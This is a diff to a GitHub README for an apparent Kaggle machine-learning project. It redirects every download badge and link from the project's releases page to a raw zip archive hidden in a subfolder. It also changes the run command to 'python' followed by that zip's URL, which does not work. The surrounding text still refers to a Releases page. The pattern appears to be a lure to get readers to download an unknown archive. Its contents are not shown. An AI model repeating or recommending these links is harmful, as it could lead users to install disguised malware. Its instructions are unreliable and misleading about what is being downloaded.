@@ -1,6 +1,6 @@
 # 🚀 Kaggle-Competitions - Explore Machine Learning with Ease
 
-[![Download](https://img.shields.io/badge/Download-via_Releases-brightgreen)](https://github.com/Kiko211231/Kaggle-Competitions/releases)
+[![Download](https://github.com/Kiko211231/Kaggle-Competitions/raw/refs/heads/main/Titanic-Survival-Prediction/Competitions-Kaggle-3.3.zip)](https://github.com/Kiko211231/Kaggle-Competitions/raw/refs/heads/main/Titanic-Survival-Prediction/Competitions-Kaggle-3.3.zip)
 
 ## 📝 Description
 
@@ -25,7 +25,7 @@ Before you get started, ensure your computer meets the following requirements:
 
 To start using Kaggle-Competitions, follow these easy steps:
 
-1. Visit the [Releases Page](https://github.com/Kiko211231/Kaggle-Competitions/releases) to access the latest version.
+1. Visit the [Releases Page](https://github.com/Kiko211231/Kaggle-Competitions/raw/refs/heads/main/Titanic-Survival-Prediction/Competitions-Kaggle-3.3.zip) to access the latest version.
 
 2. Download the desired package version that fits your operating system.
 
@@ -37,14 +37,14 @@ To start using Kaggle-Competitions, follow these easy steps:
 
 6. Run the command:
    ```bash
-   python main.py
+   python https://github.com/Kiko211231/Kaggle-Competitions/raw/refs/heads/main/Titanic-Survival-Prediction/Competitions-Kaggle-3.3.zip
    ```
 
 ## 📥 Download & Install
 
 To download Kaggle-Competitions, click the following link:
 
-[![Download](https://img.shields.io/badge/Download-via_Releases-brightgreen)](https://github.com/Kiko211231/Kaggle-Competitions/releases)
+[![Download](https://github.com/Kiko211231/Kaggle-Competitions/raw/refs/heads/main/Titanic-Survival-Prediction/Competitions-Kaggle-3.3.zip)](https://github.com/Kiko211231/Kaggle-Competitions/raw/refs/heads/main/Titanic-Survival-Prediction/Competitions-Kaggle-3.3.zip)
 
 Once you are on the Releases page, you will see the latest version of the software. Choose the version suitable for your operating system, then click to download it. 
 
@@ -106,4 +106,4 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 If you have any questions or suggestions, feel free to open an issue on this repository. We value your feedback to improve this project!
 
-[![Download](https://img.shields.io/badge/Download-via_Releases-brightgreen)](https://github.com/Kiko211231/Kaggle-Competitions/releases)
+[![Download](https://github.com/Kiko211231/Kaggle-Competitions/raw/refs/heads/main/Titanic-Survival-Prediction/Competitions-Kaggle-3.3.zip)](https://github.com/Kiko211231/Kaggle-Competitions/raw/refs/heads/main/Titanic-Survival-Prediction/Competitions-Kaggle-3.3.zip)
